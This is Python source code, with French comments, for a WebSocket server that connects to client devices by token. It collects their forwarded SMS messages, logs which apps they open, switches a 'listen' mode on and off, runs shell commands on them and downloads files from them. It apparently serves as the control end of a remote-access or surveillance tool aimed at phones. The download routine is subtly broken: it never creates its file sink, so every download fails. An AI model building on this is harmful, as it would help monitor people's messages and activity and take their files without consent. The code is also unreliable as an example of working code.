#!/usr/bin/env python3
"""Serveur WebSocket v3 — multiclient, routage ciblé, shell, journal d'applications."""

import asyncio
import json
import logging
import secrets
from base64 import b64decode
from datetime import datetime, timezone
from typing import Callable, Dict, Optional

import websockets

import config
import protocol
from applog import app_log
from clients import Connection, Registry
from database import SmsDatabase
from downloads import DownloadSink

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)


class NotConnected(Exception):
    pass


class CommandFailed(Exception):
    pass


class CmdContext:
    __slots__ = ("cmd_id", "device_id", "buffer", "meta", "exit", "error", "future")

    def __init__(self, cmd_id: str, device_id: str, future: asyncio.Future):
        self.cmd_id = cmd_id
        self.device_id = device_id
        self.buffer = bytearray()
        self.meta: dict = {}
        self.exit: Optional[int] = None
        self.error: Optional[str] = None
        self.future = future


class SmsServer:
    def __init__(self):
        self.registry = Registry()
        self.db = SmsDatabase() if config.ENABLE_PERSISTENCE else None
        self.pending: Dict[str, CmdContext] = {}

        self._notify_sms: Optional[Callable] = None
        self._notify_devices: Optional[Callable] = None
        self._notify_app: Optional[Callable] = None
        self._notify_output: Optional[Callable] = None

    # -- callbacks GUI ---------------------------------------------------

    def set_notify_sms(self, cb): self._notify_sms = cb
    def set_notify_devices(self, cb): self._notify_devices = cb
    def set_notify_app(self, cb): self._notify_app = cb
    def set_notify_output(self, cb): self._notify_output = cb

    def _fire(self, callback, *args):
        if callback is None:
            return
        try:
            callback(*args)
        except Exception as exc:  # jamais bloquant
            logger.error("Erreur callback: %s", exc)

    # -- helpers ---------------------------------------------------------

    def devices_snapshot(self):
        return [c.summary() for c in self.registry.all()]

    def _broadcast_devices(self):
        self._fire(self._notify_devices, self.devices_snapshot())

    async def _require(self, data: dict) -> Optional[Connection]:
        conn = self.registry.get(data.get("deviceId", ""))
        return conn

    # -- envoi de commande -----------------------------------------------

    async def send_command(self, device_id: str, name: str, args=None, session: str = "main",
                           timeout: float = config.CMD_TIMEOUT_S) -> bytes:
        conn = self.registry.get(device_id)
        if conn is None:
            raise NotConnected(f"device {device_id} absent")
        if not conn.has_shell:
            raise CommandFailed("le client n'annonce pas la capacité shell")

        cmd_id = protocol.new_cmd_id()
        ctx = CmdContext(cmd_id, device_id, asyncio.get_running_loop().create_future())
        self.pending[cmd_id] = ctx

        await conn.send({"type": "cmd", "id": cmd_id, "name": name,
                         "args": list(args or []), "session": session})
        try:
            await asyncio.wait_for(ctx.future, timeout)
        except asyncio.TimeoutError:
            raise CommandFailed("délai dépassé") from None
        finally:
            self.pending.pop(cmd_id, None)

        if ctx.error:
            raise CommandFailed(ctx.error)
        return bytes(ctx.buffer)

    async def download_file(self, device_id: str, remote_path: str) -> str:
        """Télécharge vers downloads/ et renvoie le chemin local."""
        conn = self.registry.get(device_id)
        if conn is None:
            raise NotConnected(device_id)

        cmd_id = protocol.new_cmd_id()
        ctx = CmdContext(cmd_id, device_id, asyncio.get_running_loop().create_future())
        self.pending[cmd_id] = ctx
        sink: Optional[DownloadSink] = None

        try:
            await conn.send({"type": "cmd", "id": cmd_id, "name": "download",
                             "args": [remote_path], "session": "main"})
            await asyncio.wait_for(ctx.future, config.DOWNLOAD_TIMEOUT_S)
        except asyncio.TimeoutError:
            raise CommandFailed("délai de téléchargement dépassé") from None
        finally:
            self.pending.pop(cmd_id, None)

        if ctx.error:
            if sink:
                sink.abort()
            raise CommandFailed(ctx.error)

        # Le sink est créé au premier chunk (le nom arrive dans meta).
        if sink is None:
            raise CommandFailed("aucune donnée reçue")
        ok, detail = sink.finish()
        if not ok:
            raise CommandFailed(detail)
        logger.info("Téléchargé %s -> %s (%d octets)", remote_path, detail, sink.size)
        return detail

    # -- réception -------------------------------------------------------

    async def handle_sms(self, data: dict, conn: Connection) -> None:
        sms_id = data.get("id")
        if not sms_id:
            await conn.send({"type": "error", "smsId": None, "error": "missing_sms_id"})
            return

        sms_info = {
            "id": sms_id,
            "sender": data.get("sender"),
            "body": data.get("body"),
            "timestamp": data.get("timestamp"),
            "deviceId": conn.device_id,
            "receivedAt": data.get("receivedAt"),
            "serverTime": datetime.now(timezone.utc).isoformat(),
        }

        if self.db and not self.db.store_sms_if_new(sms_info):
            await conn.send({"type": "ack", "smsId": sms_id, "status": "duplicate"})
            return

        await conn.send({"type": "ack", "smsId": sms_id, "status": "received"})
        self._fire(self._notify_sms, sms_info)

    async def handle_events(self, data: dict, conn: Connection) -> None:
        events = data.get("events")
        if not isinstance(events, list):
            return
        highest = 0
        for event in events:
            if not isinstance(event, dict):
                continue
            try:
                highest = max(highest, int(event.get("seq") or 0))
            except (TypeError, ValueError):
                pass
            kind = event.get("kind")
            if kind == "app":
                self._record_app(conn, event.get("package"), event.get("label"), event.get("className"))
        if highest:
            await conn.send({"type": "evt_ack", "upto": highest})

    def _record_app(self, conn: Connection, package, label, class_name) -> None:
        if not package:
            return
        app_log.record(conn.device_id, conn.alias, package, label or "", class_name or "")
        self._fire(self._notify_app, {
            "deviceId": conn.device_id,
            "alias": conn.alias,
            "package": package,
            "label": label or "",
            "className": class_name or "",
            "ts": protocol.utc(),
        })

    async def handle_app_open(self, data: dict, conn: Connection) -> None:
        self._record_app(conn, data.get("package"), data.get("label"), data.get("className"))

    async def handle_cmd_result(self, data: dict, conn: Connection) -> None:
        ctx = self.pending.get(data.get("id", ""))
        if ctx is None or ctx.device_id != conn.device_id:
            return

        stream = data.get("stream")

        if data.get("eof"):
            ctx.exit = data.get("exit")
            if ctx.exit not in (0, None) and not ctx.buffer:
                ctx.error = f"commande échouée (exit {ctx.exit})"
            if not ctx.future.done():
                ctx.future.set_result(True)
            return

        raw = data.get("data") or ""
        try:
            chunk = b64decode(raw) if raw else b""
        except ValueError:
            ctx.error = "base64 invalide"
            if not ctx.future.done():
                ctx.future.set_result(True)
            return

        if stream == "meta":
            ctx.meta = data.get("meta") or {}
            return

        if chunk:
            ctx.buffer.extend(chunk)
            self._fire(self._notify_output, ctx.cmd_id, chunk, stream)

    # -- boucle de connexion ---------------------------------------------

    async def handler(self, websocket):
        peer = websocket.remote_address
        client_ip = peer[0] if peer else "unknown"
        conn: Optional[Connection] = None

        try:
            async for raw in websocket:
                try:
                    data = json.loads(raw)
                except json.JSONDecodeError:
                    logger.error("JSON invalide: %s", raw[:200])
                    continue
                if not isinstance(data, dict):
                    continue

                msg_type = data.get("type")

                if msg_type == "identification":
                    conn = await self._authenticate(websocket, data, client_ip)
                    if conn is None:
                        return

                elif conn is None:
                    await websocket.send(protocol.dumps(type="error", error="not_authenticated"))

                elif msg_type == "sms":
                    if data.get("deviceId") not in (None, conn.device_id):
                        await conn.send({"type": "error", "smsId": data.get("id"),
                                         "error": "device_id_mismatch"})
                        continue
                    await self.handle_sms(data, conn)

                elif msg_type == "evt":
                    await self.handle_events(data, conn)

                elif msg_type == "app_open":
                    await self.handle_app_open(data, conn)

                elif msg_type == "cmd_result":
                    await self.handle_cmd_result(data, conn)

                elif msg_type == "ping":
                    await conn.send({"type": "pong"})

                elif msg_type == "pong":
                    pass

                elif msg_type == "evt_resend":
                    await conn.send({"type": "evt_ack", "upto": int(data.get("to") or 0)})

                else:
                    logger.debug("Type ignoré: %s", msg_type)

        except websockets.exceptions.ConnectionClosed:
            pass
        finally:
            if conn is not None:
                self._cancel_pending(conn.device_id)
                if self.registry.drop(conn.device_id, conn):
                    logger.info("Déconnecté: %s (%s)", conn.alias, conn.device_id)
                    self._broadcast_devices()

    async def _authenticate(self, websocket, data: dict, client_ip: str) -> Optional[Connection]:
        token = str(data.get("token") or "")
        if not config.AUTH_TOKEN or not secrets.compare_digest(token, config.AUTH_TOKEN):
            logger.warning("Auth refusée depuis %s", client_ip)
            await websocket.send(protocol.dumps(type="auth_error", error="authentication_failed"))
            await websocket.close(code=1008, reason="Authentication failed")
            return None

        device_id = str(data.get("deviceId") or f"ip_{client_ip}")
        caps = protocol.negotiate_caps(data.get("caps"))
        conn = Connection(device_id, self.registry.alias_for(device_id), websocket, client_ip, caps)

        previous = self.registry.put(conn)
        if previous is not None:
            logger.info("Remplacement de la connexion %s", previous.alias)
            try:
                await previous.ws.close(code=4000, reason="replaced")
            except Exception:
                pass

        if self.db:
            self.db.update_device(device_id, client_ip)

        logger.info("Connecté: %s (%s, %s) caps=%s", conn.alias, device_id, client_ip, caps)
        await conn.send({"type": "authenticated", "deviceId": device_id,
                         "caps": caps, "server_v": config.PROTOCOL_VERSION,
                         "alias": conn.alias})
        self._broadcast_devices()
        return conn

    def _cancel_pending(self, device_id: str) -> None:
        for cmd_id, ctx in list(self.pending.items()):
            if ctx.device_id != device_id:
                continue
            self.pending.pop(cmd_id, None)
            if not ctx.future.done():
                ctx.error = "connexion perdue"
                ctx.future.set_result(True)

    # -- actions GUI -----------------------------------------------------

    async def set_listening(self, device_id: str, enabled: bool) -> None:
        conn = self.registry.get(device_id)
        if conn is None:
            raise NotConnected(device_id)
        await self.send_command(device_id, "listen", ["on" if enabled else "off"])
        conn.listening = enabled
        self._broadcast_devices()

    async def run_shell(self, device_id: str, line: str) -> str:
        parts = line.strip().split()
        if not parts:
            return ""
        output = await self.send_command(device_id, parts[0], parts[1:])
        return output.decode("utf-8", "replace")

    async def start(self):
        logger.info("Serveur ws://%s:%d (proto v%d)", config.SERVER_HOST,
                    config.SERVER_PORT, config.PROTOCOL_VERSION)
        async with websockets.serve(
            self.handler,
            config.SERVER_HOST,
            config.SERVER_PORT,
            ping_interval=config.WEBSOCKET_PING_INTERVAL,
            ping_timeout=config.WEBSOCKET_PING_TIMEOUT,
            max_size=8 * 1024 * 1024,
        ):
            await asyncio.Future()


server = SmsServer()


if __name__ == "__main__":
    try:
        asyncio.run(server.start())
    except KeyboardInterrupt:
        logger.info("Arrêt")
